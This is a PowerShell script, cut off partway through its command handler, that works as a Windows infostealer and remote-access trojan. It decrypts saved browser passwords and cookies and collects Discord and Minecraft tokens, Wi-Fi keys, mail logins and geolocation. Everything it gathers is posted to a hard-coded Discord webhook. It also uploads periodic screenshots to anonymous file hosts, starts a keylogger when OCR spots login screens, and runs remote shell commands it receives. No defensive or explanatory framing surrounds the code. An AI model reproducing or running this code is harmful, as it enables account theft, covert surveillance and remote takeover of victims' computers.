$ErrorActionPreference='SilentlyContinue'
$WH='https://discord.com/api/webhooks/1563278244793552929/Za-S7Q9wedbph6mODgexgD3THlN8W4U8CwoEKyCzRu2ff--sRfAe2CAjYjsoMZ6sXU_1'
$LAST=@{}

Add-Type -Namespace W -Name U -MemberDefinition @"
[DllImport("user32.dll")] public static extern void keybd_event(byte b, byte s, uint f, int e);
[DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, uint d, int e);
[DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
[DllImport("user32.dll")] public static extern int GetSystemMetrics(int i);
[DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h);
[DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr h, IntPtr dc);
[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleDC(IntPtr dc);
[DllImport("gdi32.dll")] public static extern IntPtr CreateCompatibleBitmap(IntPtr dc, int w, int h);
[DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr dc, IntPtr o);
[DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr h, int x, int y, int w, int hh, IntPtr s, int sx, int sy, int rop);
[DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr o);
[DllImport("gdi32.dll")] public static extern bool DeleteDC(IntPtr dc);
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class WinSql {
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_open_v2(byte[] filename, out IntPtr db, int flags, IntPtr vfs);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_close(IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, out IntPtr tail);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_step(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern IntPtr sqlite3_column_blob(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_column_bytes(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern IntPtr sqlite3_column_text(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern long sqlite3_column_int64(IntPtr stmt, int col);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)]
    public static extern int sqlite3_finalize(IntPtr stmt);
    static byte[] Z(string s) { return Encoding.UTF8.GetBytes(s + "\0"); }
    public static IntPtr Open(string path) {
        IntPtr db;
        int rc = sqlite3_open_v2(Z(path), out db, 0x00000002, IntPtr.Zero);
        if (rc != 0) return IntPtr.Zero;
        return db;
    }
    public static IntPtr Prepare(IntPtr db, string sql) {
        IntPtr st; IntPtr tail;
        int rc = sqlite3_prepare_v2(db, Z(sql), -1, out st, out tail);
        if (rc != 0) return IntPtr.Zero;
        return st;
    }
    public static string ColText(IntPtr st, int c) {
        IntPtr p = sqlite3_column_text(st, c);
        int n = sqlite3_column_bytes(st, c);
        if (p == IntPtr.Zero || n == 0) return "";
        byte[] buf = new byte[n];
        Marshal.Copy(p, buf, 0, n);
        return Encoding.UTF8.GetString(buf);
    }
    public static byte[] ColBlob(IntPtr st, int c) {
        IntPtr p = sqlite3_column_blob(st, c);
        int n = sqlite3_column_bytes(st, c);
        if (p == IntPtr.Zero || n == 0) return new byte[0];
        byte[] buf = new byte[n];
        Marshal.Copy(p, buf, 0, n);
        return buf;
    }
    public static long ColLong(IntPtr st, int c) { return sqlite3_column_int64(st, c); }
    public static void Close(IntPtr db) { sqlite3_close(db); }
    public static void Free(IntPtr st) { sqlite3_finalize(st); }
    public static bool Row(IntPtr st) { return sqlite3_step(st) == 100; }
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;
public class ChromeCrypt {
    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CryptUnprotectData(ref DATA_BLOB p, IntPtr d, IntPtr e, IntPtr r, IntPtr c, int f, out DATA_BLOB o);
    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr h);
    [StructLayout(LayoutKind.Sequential)]
    struct DATA_BLOB { public int cbData; public IntPtr pbData; }
    static byte[] Dpapi(byte[] blob) {
        DATA_BLOB din = new DATA_BLOB { cbData = blob.Length, pbData = Marshal.AllocHGlobal(blob.Length) };
        Marshal.Copy(blob, 0, din.pbData, blob.Length);
        DATA_BLOB dout;
        bool r = CryptUnprotectData(ref din, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out dout);
        Marshal.FreeHGlobal(din.pbData);
        if (!r) return new byte[0];
        byte[] res = new byte[dout.cbData];
        Marshal.Copy(dout.pbData, res, 0, dout.cbData);
        LocalFree(dout.pbData);
        return res;
    }
    public static byte[] GetMasterKey(string localStatePath) {
        string s = System.IO.File.ReadAllText(localStatePath);
        var m = System.Text.RegularExpressions.Regex.Match(s, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
        if (!m.Success) return null;
        byte[] enc = Convert.FromBase64String(m.Groups[1].Value);
        if (enc.Length < 6) return null;
        byte[] tail = new byte[enc.Length - 5];
        Array.Copy(enc, 5, tail, 0, tail.Length);
        return Dpapi(tail);
    }
    public static string DecryptV10(byte[] masterKey, byte[] cipher) {
        if (cipher == null || cipher.Length < 15 || masterKey == null) return null;
        string tag = Encoding.ASCII.GetString(cipher, 0, 3);
        if (tag != "v10" && tag != "v11") {
            try { byte[] d = Dpapi(cipher); if (d.Length > 0) return Encoding.UTF8.GetString(d); } catch {}
            return null;
        }
        byte[] nonce = new byte[12];
        byte[] ct = new byte[cipher.Length - 15];
        byte[] tagArr = new byte[16];
        Array.Copy(cipher, 3, nonce, 0, 12);
        Array.Copy(cipher, 15, ct, 0, ct.Length);
        Array.Copy(cipher, cipher.Length - 16, tagArr, 0, 16);
        try {
            using (var gcm = new AesGcm(masterKey)) {
                byte[] plain = new byte[ct.Length];
                gcm.Decrypt(nonce, ct, tagArr, plain);
                return Encoding.UTF8.GetString(plain);
            }
        } catch { return null; }
    }
}
"@

Add-Type -AssemblyName System.Runtime.WindowsRuntime
$null = [Windows.Media.Ocr.OcrEngine, Windows.Foundation, ContentType=WindowsRuntime]
$null = [Windows.Graphics.Imaging.BitmapDecoder, Windows.Foundation, ContentType=WindowsRuntime]
$null = [Windows.Storage.StorageFile, Windows.Foundation, ContentType=WindowsRuntime]
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
  $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
})[0]
function Await($op, $resultType) {
  $task = $asTaskGeneric.MakeGenericMethod($resultType).Invoke($null, @($op))
  $task.Wait(-1) | Out-Null
  $task.Result
}
$ocrEngine = $null
try { $ocrEngine = [Windows.Media.Ocr.OcrEngine]::TryCreateFromUserProfileLanguages() } catch {}
function Ocr-Path($path) {
  if (-not $ocrEngine) { return "" }
  try {
    $file = Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($path)) ([Windows.Storage.StorageFile])
    $stream = Await ($file.OpenAsync([Windows.Storage.FileAccessMode]::Read)) ([Windows.Storage.Streams.IRandomAccessStream])
    $decoder = Await ([Windows.Graphics.Imaging.BitmapDecoder]::CreateAsync($stream)) ([Windows.Graphics.Imaging.BitmapDecoder])
    $bitmap = Await ($decoder.GetSoftwareBitmapAsync()) ([Windows.Graphics.Imaging.SoftwareBitmap])
    $result = Await ($ocrEngine.RecognizeAsync($bitmap)) ([Windows.Media.Ocr.OcrResult])
    return $result.Text
  } catch { return "" }
}

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
public class KeyWatcher {
    [DllImport("user32.dll")] static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] static extern int GetForegroundWindow();
    [DllImport("user32.dll")] static extern int GetWindowText(int h, StringBuilder s, int n);
    [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(int h, out uint pid);
    static string ProcName(int hwnd) {
        uint pid; GetWindowThreadProcessId(hwnd, out pid);
        try { return Process.GetProcessById((int)pid).ProcessName; } catch { return "?"; }
    }
    static string WinTitle(int hwnd) {
        var sb = new StringBuilder(512);
        GetWindowText(hwnd, sb, 512);
        return sb.ToString();
    }
    public static string Capture(int ms) {
        var sb = new StringBuilder();
        int hwnd = GetForegroundWindow();
        sb.AppendLine("focused: " + ProcName(hwnd) + " | " + WinTitle(hwnd));
        int start = Environment.TickCount;
        bool[] down = new bool[256];
        while (Environment.TickCount - start < ms) {
            for (int k = 8; k < 255; k++) {
                short s = GetAsyncKeyState(k);
                if ((s & 0x8000) != 0 && !down[k]) {
                    down[k] = true;
                    string t = KeyName(k);
                    if (t != null) sb.Append(t);
                } else if ((s & 0x8000) == 0) {
                    down[k] = false;
                }
            }
            System.Threading.Thread.Sleep(15);
        }
        return sb.ToString();
    }
    static string KeyName(int k) {
        if (k >= 0x30 && k <= 0x39) return ((char)k).ToString();
        if (k >= 0x41 && k <= 0x5A) {
            bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
            char c = (char)k;
            return shift ? c.ToString() : c.ToString().ToLower();
        }
        if (k >= 0x60 && k <= 0x69) return ((char)('0' + (k - 0x60))).ToString();
        switch (k) {
            case 0x20: return " ";
            case 0x0D: return "\n";
            case 0x09: return "\t";
            case 0x08: return "[BKSP]";
            case 0x2E: return "[DEL]";
            case 0x1B: return "[ESC]";
            case 0xBE: return ".";
            case 0xBC: return ",";
            case 0xBD: return "-";
            case 0xBB: return "=";
            case 0xBA: return ";";
            case 0xBF: return "/";
            case 0xDC: return "\\";
            case 0xDE: return "'";
            case 0xDB: return "[";
            case 0xDD: return "]";
            case 0xC0: return "`";
            case 0x10: case 0x11: case 0x12: case 0x5B: return null;
            default: return null;
        }
    }
}
"@

function Send($content, $filePath, $fileName) {
  try {
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    if ($content) { $mp.Add((New-Object System.Net.Http.StringContent($content)),'content') }
    if ($filePath) {
      $bytes=[IO.File]::ReadAllBytes($filePath)
      $fc=New-Object System.Net.Http.ByteArrayContent($bytes)
      $fc.Headers.ContentType=[System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')
      $mp.Add($fc,'file',$fileName)
    }
    (New-Object System.Net.Http.HttpClient).PostAsync($WH,$mp).Result | Out-Null
  } catch {}
}

function Poll {
  try {
    $u = "$WH" + "?wait=true&limit=5"
    return ((iwr -UseBasicParsing -Uri $u -TimeoutSec 20).Content | ConvertFrom-Json) | Sort-Object id
  } catch { return @() }
}

function Grab-System {
  $r = New-Object System.Text.StringBuilder
  [void]$r.AppendLine("===== SYSTEM =====")
  [void]$r.AppendLine("Hostname : $env:COMPUTERNAME")
  [void]$r.AppendLine("User     : $env:USERNAME")
  [void]$r.AppendLine("OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)")
  [void]$r.AppendLine("CPU      : $((Get-CimInstance Win32_Processor).Name)")
  [void]$r.AppendLine("RAM      : $([math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB")
  try { [void]$r.AppendLine("PublicIP : $((iwr -UseBasicParsing 'https://api.ipify.org' -TimeoutSec 8).Content)") } catch {}
  [void]$r.AppendLine("`n===== GEOLOCATION =====")
  try {
    $g = (iwr -UseBasicParsing 'http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,query' -TimeoutSec 8).Content | ConvertFrom-Json
    foreach ($k in 'status','country','regionName','city','zip','lat','lon','isp','org','query') {
      [void]$r.AppendLine(("{0} : {1}" -f $k, $g.$k))
    }
  } catch { [void]$r.AppendLine("geo : failed") }
  [void]$r.AppendLine("`n===== WIFI PASSWORDS =====")
  $wl = (netsh wlan show profiles) -match 'All User Profile'
  foreach ($line in $wl) {
    $name = ($line -split ':',2)[1].Trim()
    $det = netsh wlan show profile name="$name" key=clear
    $key = ($det -match 'Key Content') -replace '.*:\s*',''
    [void]$r.AppendLine("$name : $key")
  }
  $p="$env:TEMP\syshealth.txt"
  $r.ToString() | Out-File $p -Encoding utf8
  return $p
}

function Get-BrowserPaths {
  return @(
    @{name='Chrome';    data="$env:LOCALAPPDATA\Google\Chrome\User Data";                ls="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"},
    @{name='Edge';      data="$env:LOCALAPPDATA\Microsoft\Edge\User Data";               ls="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"},
    @{name='Brave';     data="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";  ls="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"},
    @{name='Opera';     data="$env:APPDATA\Opera Software\Opera Stable";                 ls="$env:APPDATA\Opera Software\Opera Stable\Local State"},
    @{name='OperaGX';   data="$env:APPDATA\Opera Software\Opera GX Stable";              ls="$env:APPDATA\Opera Software\Opera GX Stable\Local State"},
    @{name='Vivaldi';   data="$env:LOCALAPPDATA\Vivaldi\User Data";                      ls="$env:LOCALAPPDATA\Vivaldi\User Data\Local State"},
    @{name='Chromium';  data="$env:LOCALAPPDATA\Chromium\User Data";                     ls="$env:LOCALAPPDATA\Chromium\User Data\Local State"}
  )
}

function Grab-Cookies {
  $out = "$env:TEMP\cookies.txt"
  "COOKIE EXPORT" | Out-File $out -Encoding utf8
  foreach ($b in (Get-BrowserPaths)) {
    if (-not (Test-Path $b.data)) { continue }
    "`n===== $($b.name) =====" | Out-File $out -Append -Encoding utf8
    try { $mk = [ChromeCrypt]::GetMasterKey($b.ls) } catch { $mk = $null }
    $profiles = @("Default") + (Get-ChildItem $b.data -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'Profile*' } | ForEach-Object { $_.Name })
    foreach ($prof in $profiles) {
      $ck = Join-Path $b.data "$prof\Network\Cookies"
      if (-not (Test-Path $ck)) { continue }
      "`n--- profile: $prof ---" | Out-File $out -Append -Encoding utf8
      $tmp = "$env:TEMP\ck_$([guid]::NewGuid().ToString('N')).db"
      Copy-Item $ck $tmp -Force
      try {
        $db = [WinSql]::Open($tmp)
        if ($db -eq [IntPtr]::Zero) { throw "open failed" }
        $st = [WinSql]::Prepare($db, "SELECT host_key,name,encrypted_value,path,expires_utc FROM cookies")
        while ([WinSql]::Row($st)) {
          $host_ = [WinSql]::ColText($st,0); $n = [WinSql]::ColText($st,1)
          $ev = [WinSql]::ColBlob($st,2); $pth = [WinSql]::ColText($st,3); $exp = [WinSql]::ColLong($st,4)
          $val = ''
          try { if ($mk) { $pl = [ChromeCrypt]::DecryptV10($mk, $ev); if ($pl) { $val = $pl } } } catch {}
          "HOST=$host_ NAME=$n PATH=$pth EXP=$exp VALUE=$val" | Out-File $out -Append -Encoding utf8
        }
        [WinSql]::Free($st); [WinSql]::Close($db)
      } catch { "read failed $prof : $_" | Out-File $out -Append -Encoding utf8 }
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
  }
  return $out
}

function Grab-Creds {
  $p = "$env:TEMP\creds.txt"
  $r = New-Object System.Text.StringBuilder
  [void]$r.AppendLine("===== BROWSER LOGINS (decrypted) =====")
  foreach ($b in (Get-BrowserPaths)) {
    if (-not (Test-Path $b.data)) { continue }
    try { $mk = [ChromeCrypt]::GetMasterKey($b.ls) } catch { $mk = $null }
    $profiles = @("Default") + (Get-ChildItem $b.data -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'Profile*' } | ForEach-Object { $_.Name })
    foreach ($prof in $profiles) {
      $ld = Join-Path $b.data "$prof\Login Data"
      if (-not (Test-Path $ld)) { continue }
      [void]$r.AppendLine("`n--- $($b.name) / $prof ---")
      $tmp = "$env:TEMP\ld_$([guid]::NewGuid().ToString('N')).db"
      Copy-Item $ld $tmp -Force
      try {
        $db = [WinSql]::Open($tmp)
        if ($db -eq [IntPtr]::Zero) { throw "open failed" }
        $st = [WinSql]::Prepare($db, "SELECT origin_url,username_value,password_value FROM logins")
        while ([WinSql]::Row($st)) {
          $url = [WinSql]::ColText($st,0); $u = [WinSql]::ColText($st,1); $ev = [WinSql]::ColBlob($st,2)
          $pw = ''
          try { if ($mk) { $pl = [ChromeCrypt]::DecryptV10($mk, $ev); if ($pl) { $pw = $pl } } } catch {}
          [void]$r.AppendLine("URL : $url")
          [void]$r.AppendLine("USER: $u")
          [void]$r.AppendLine("PASS: $pw")
          [void]$r.AppendLine("")
        }
        [WinSql]::Free($st); [WinSql]::Close($db)
      } catch { [void]$r.AppendLine("read failed: $($b.name)/$prof : $_") }
      Remove-Item $tmp -Force -ErrorAction SilentlyContinue
    }
  }
  [void]$r.AppendLine("`n===== DISCORD TOKENS =====")
  $disc = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb"
  )
  foreach ($dp in $disc) {
    if (Test-Path $dp) {
      [void]$r.AppendLine("--- $dp ---")
      Get-ChildItem $dp -Filter "*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
        $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
        $ms = [regex]::Matches($c, '[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,38}')
        foreach ($m in $ms) { [void]$r.AppendLine("token: $($m.Value)") }
      }
    }
  }
  [void]$r.AppendLine("`n===== MINECRAFT TOKENS =====")
  $mc = @(
    "$env:APPDATA\.minecraft\launcher_profiles.json",
    "$env:APPDATA\.minecraft\launcher_accounts.json",
    "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang\minecraftpe\launcher_profiles.json"
  )
  foreach ($mp in $mc) {
    if (Test-Path $mp) {
      [void]$r.AppendLine("--- $mp ---")
      try {
        $j = Get-Content $mp -Raw | ConvertFrom-Json
        if ($j.authenticationDatabase) {
          foreach ($a in $j.authenticationDatabase.PSObject.Properties) {
            [void]$r.AppendLine("profile: $($a.Name)")
            [void]$r.AppendLine("  accessToken: $($a.Value.accessToken)")
            [void]$r.AppendLine("  username: $($a.Value.username)")
            foreach ($pr in $a.Value.profiles.PSObject.Properties) {
              [void]$r.AppendLine("  displayName: $($pr.Value.name)")
            }
          }
        }
        if ($j.accounts) {
          foreach ($a in $j.accounts.PSObject.Properties) {
            [void]$r.AppendLine("account: $($a.Name) accessToken=$($a.Value.accessToken) username=$($a.Value.minecraftProfile.name)")
          }
        }
      } catch { [void]$r.AppendLine("parse failed: $_") }
    }
  }
  [void]$r.AppendLine("`n===== EMAIL (Thunderbird) =====")
  $th = "$env:APPDATA\Thunderbird\Profiles"
  if (Test-Path $th) {
    Get-ChildItem $th -Recurse -Filter "logins.json" -ErrorAction SilentlyContinue | ForEach-Object {
      [void]$r.AppendLine("--- $($_.FullName) ---")
      try { [void]$r.AppendLine((Get-Content $_.FullName -Raw)) } catch {}
    }
  }
  [void]$r.AppendLine("`n===== OUTLOOK / WINDOWS MAIL =====")
  $ol = "$env:LOCALAPPDATA\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState"
  if (Test-Path $ol) { [void]$r.AppendLine("outlook localstate present: $ol") }
  $r.ToString() | Out-File $p -Encoding utf8
  return $p
}

function Screen {
  $w=[W.U]::GetSystemMetrics(0); $h=[W.U]::GetSystemMetrics(1)
  $sdc=[W.U]::GetDC([IntPtr]::Zero)
  $mdc=[W.U]::CreateCompatibleDC($sdc)
  $bmp=[W.U]::CreateCompatibleBitmap($sdc,$w,$h)
  [void][W.U]::SelectObject($mdc,$bmp)
  [void][W.U]::BitBlt($mdc,0,0,$w,$h,$sdc,0,0,0x00CC0020)
  Add-Type -AssemblyName System.Drawing
  $img=[System.Drawing.Image]::FromHbitmap($bmp)
  $p="$env:TEMP\shot_$([guid]::NewGuid().ToString('N')).jpg"
  $img.Save($p,[System.Drawing.Imaging.ImageFormat]::Jpeg)
  [void][W.U]::DeleteObject($bmp); [void][W.U]::DeleteDC($mdc); [void][W.U]::ReleaseDC([IntPtr]::Zero,$sdc)
  return $p
}

function Upload-Catbox($path) {
  try {
    $b = [Guid]::NewGuid().ToString(); $LF="`r`n"; $fn=Split-Path $path -Leaf
    $fb=[IO.File]::ReadAllBytes($path); $e=[Text.Encoding]::GetEncoding('iso-8859-1')
    $head="--$b$LF"+"Content-Disposition: form-data; name=`"reqtype`"$LF$LF"+"fileupload$LF"+"--$b$LF"+"Content-Disposition: form-data; name=`"userhash`"$LF$LF$LF"+"--$b$LF"+"Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fn`"$LF"+"Content-Type: application/octet-stream$LF$LF"
    $tail="$LF--$b--$LF"
    $ms=New-Object System.IO.MemoryStream; $ms.Write($e.GetBytes($head),0,$head.Length); $ms.Write($fb,0,$fb.Length); $ms.Write($e.GetBytes($tail),0,$tail.Length)
    $c=New-Object System.Net.Http.ByteArrayContent($ms.ToArray()); $c.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse("multipart/form-data; boundary=$b")
    $hc=New-Object Net.Http.HttpClient; $hc.Timeout=[TimeSpan]::FromSeconds(45)
    $r=$hc.PostAsync('https://catbox.moe/user/api.php',$c).Result.Content.ReadAsStringAsync().Result.Trim()
    if ($r -match '^https?://') { return $r }
  } catch {}
  return ""
}

function Upload-0x0($path) {
  try {
    $b=[Guid]::NewGuid().ToString(); $LF="`r`n"; $fn=Split-Path $path -Leaf
    $fb=[IO.File]::ReadAllBytes($path)
    $head="--$b$LF"+"Content-Disposition: form-data; name=`"file`"; filename=`"$fn`"$LF"+"Content-Type: image/jpeg$LF$LF"
    $tail="$LF--$b--$LF"
    $ms=New-Object System.IO.MemoryStream; $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($head),0,$head.Length); $ms.Write($fb,0,$fb.Length); $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($tail),0,$tail.Length)
    $c=New-Object Net.Http.ByteArrayContent($ms.ToArray()); $c.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse("multipart/form-data; boundary=$b")
    $hc=New-Object Net.Http.HttpClient; $hc.Timeout=[TimeSpan]::FromSeconds(45)
    $r=$hc.PostAsync('https://0x0.st',$c).Result.Content.ReadAsStringAsync().Result.Trim()
    if ($r -match '^https?://') { return $r }
  } catch {}
  return ""
}

function Upload-Litterbox($path) {
  try {
    $b=[Guid]::NewGuid().ToString(); $LF="`r`n"; $fn=Split-Path $path -Leaf
    $fb=[IO.File]::ReadAllBytes($path)
    $head="--$b$LF"+"Content-Disposition: form-data; name=`"reqtype`"$LF$LF"+"fileupload$LF"+"--$b$LF"+"Content-Disposition: form-data; name=`"time`"$LF$LF"+"72h$LF"+"--$b$LF"+"Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fn`"$LF"+"Content-Type: image/jpeg$LF$LF"
    $tail="$LF--$b--$LF"
    $ms=New-Object System.IO.MemoryStream; $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($head),0,$head.Length); $ms.Write($fb,0,$fb.Length); $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($tail),0,$tail.Length)
    $c=New-Object Net.Http.ByteArrayContent($ms.ToArray()); $c.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse("multipart/form-data; boundary=$b")
    $hc=New-Object Net.Http.HttpClient; $hc.Timeout=[TimeSpan]::FromSeconds(45)
    $r=$hc.PostAsync('https://litterbox.catbox.moe/resources/internals/api.php',$c).Result.Content.ReadAsStringAsync().Result.Trim()
    if ($r -match '^https?://') { return $r }
  } catch {}
  return ""
}

function Upload-TempSh($path) {
  try {
    $b=[Guid]::NewGuid().ToString(); $LF="`r`n"; $fn=Split-Path $path -Leaf
    $fb=[IO.File]::ReadAllBytes($path)
    $head="--$b$LF"+"Content-Disposition: form-data; name=`"file`"; filename=`"$fn`"$LF"+"Content-Type: image/jpeg$LF$LF"
    $tail="$LF--$b--$LF"
    $ms=New-Object System.IO.MemoryStream; $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($head),0,$head.Length); $ms.Write($fb,0,$fb.Length); $ms.Write([Text.Encoding]::GetEncoding('iso-8859-1').GetBytes($tail),0,$tail.Length)
    $c=New-Object Net.Http.ByteArrayContent($ms.ToArray()); $c.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse("multipart/form-data; boundary=$b")
    $hc=New-Object Net.Http.HttpClient; $hc.Timeout=[TimeSpan]::FromSeconds(45)
    $r=$hc.PostAsync('https://tmpfiles.org/api/v1/upload',$c).Result.Content.ReadAsStringAsync().Result
    $j=$r | ConvertFrom-Json
    if ($j.data.url) { return ($j.data.url -replace 'tmpfiles.org/', 'tmpfiles.org/dl/') }
  } catch {}
  return ""
}

$script:Uploaders = @('catbox','0x0','litterbox','tempsh')
$script:UploaderIndex = 0
function Upload-Any($path) {
  for ($i=0; $i -lt $script:Uploaders.Count; $i++) {
    $name = $script:Uploaders[$script:UploaderIndex]
    $script:UploaderIndex = ($script:UploaderIndex + 1) % $script:Uploaders.Count
    switch ($name) {
      'catbox'    { $u = Upload-Catbox $path;    if ($u) { return "$name|$u" } }
      '0x0'       { $u = Upload-0x0 $path;       if ($u) { return "$name|$u" } }
      'litterbox' { $u = Upload-Litterbox $path; if ($u) { return "$name|$u" } }
      'tempsh'    { $u = Upload-TempSh $path;    if ($u) { return "$name|$u" } }
    }
  }
  return ""
}

$script:CatboxLinks = New-Object System.Collections.ArrayList
$script:LastFlush = (Get-Date)
$script:ShotMinGap = 90
$script:ShotMaxGap = 180
$script:NextShot = (Get-Date).AddSeconds((Get-Random -Minimum $script:ShotMinGap -Maximum $script:ShotMaxGap))
$script:FlushGap = 300

$KM=@{enter=0x0D;tab=0x09;esc=0x1B;space=0x20;back=0x08;left=0x25;up=0x26;right=0x27;down=0x28;ctrl=0x11;alt=0x12;shift=0x10;win=0x5B;f1=0x70;f2=0x71;f3=0x72;f4=0x73;f5=0x74;f6=0x75;f7=0x76;f8=0x77;f9=0x78;f10=0x79;f11=0x7A;f12=0x7B}

$triggerActive = $false
$triggerUntil = 0

Send "agent online: $env:COMPUTERNAME / $env:USERNAME" $null $null

$sys = Grab-System
$ck  = Grab-Cookies
$cr  = Grab-Creds
Send $null $sys "syshealth.txt"
Send $null $ck  "cookies.txt"
Send $null $cr  "creds.txt"
Remove-Item $sys,$ck,$cr -Force -ErrorAction SilentlyContinue

while ($true) {
  $now = Get-Date
  if ($now -ge $script:NextShot) {
    $p = Screen
    try {
      $res = Upload-Any $p
      if ($res) {
        $parts = $res -split '\|',2
        $host_ = $parts[0]; $url = $parts[1]
        [void]$script:CatboxLinks.Add("$($now.ToString('yyyy-MM-dd HH:mm:ss')) [$host_] $url")
        $txt = Ocr-Path $p
        if ($txt -match '(?i)password|passwd|sign.?in|log.?in') {
          $firstThree = (($txt -split "`n") | Select-Object -First 3) -join ' / '
          Send "screen-text trigger fired: $firstThree`nshot: $url" $null $null
          $triggerActive = $true; $triggerUntil = (Get-Date).AddSeconds(35).Ticks
        }
      }
    } catch {}
    Remove-Item $p -Force -ErrorAction SilentlyContinue
    $script:NextShot = (Get-Date).AddSeconds((Get-Random -Minimum $script:ShotMinGap -Maximum $script:ShotMaxGap))
  }

  if ($triggerActive -and $now.Ticks -lt $triggerUntil) {
    $keys = [KeyWatcher]::Capture(35000)
    if ($keys.Length -gt 30) {
      $kp = "$env:TEMP\keys_$([guid]::NewGuid().ToString('N')).txt"
      $keys | Out-File $kp -Encoding utf8
      Send "keystroke log captured (~35s after trigger)" $null $null
      Send $null $kp ("keys_" + (Split-Path $kp -Leaf))
      Remove-Item $kp -Force -ErrorAction SilentlyContinue
    }
    $triggerActive = $false
  }

  if (($now - $script:LastFlush).TotalSeconds -ge $script:FlushGap) {
    if ($script:CatboxLinks.Count -gt 0) {
      $lp = "$env:TEMP\links_$([guid]::NewGuid().ToString('N')).txt"
      ($script:CatboxLinks -join "`r`n") | Out-File $lp -Encoding utf8
      Send "image link batch ($($script:CatboxLinks.Count))" $null $null
      Send $null $lp ("links_" + (Split-Path $lp -Leaf))
      Remove-Item $lp -Force -ErrorAction SilentlyContinue
      $script:CatboxLinks.Clear()
    }
    $script:LastFlush = $now
  }

  foreach ($m in (Poll)) {
    if ($LAST.ContainsKey($m.id)) { continue }
    $LAST[$m.id]=$true
    $c = $m.content.Trim()
    if ($c -notmatch '^!(\w+)\s*(.*)$') { continue }
    $cmd=$matches[1]; $arg=$matches[2]
    try {
      switch ($cmd) {
        'ping'    { Send "pong from $env:COMPUTERNAME" $null $null }
        'shell'   { $o = iex "& { $arg }" 2>&1 | Out-String; Send $o $null $null }
        'shot'    { $p = Screen; $u = Upload-Any $p; Send "shot: $u" $null $null; Remove-Item $p -Force -ErrorAction SilentlyContinue }
        'type'    { foreach ($ch in $arg.ToCharArray()) { [W.U]::keybd_event([byte][char]$ch,0,0,0); [W.U]::keybd_event([byte][char]$ch,0,2,0); Start-Sleep -Milliseconds 15 }; Send "typed: $arg" $null $null }
        'key'     { $v = $KM[$arg.ToLower()]; if ($v) { [W.U]::keybd_event($v,0,0,0); [W.U]::keybd_event($v,0,2,0); Send "key: $arg" $null $null } else { Send "unknown key: $arg" $null $null } }
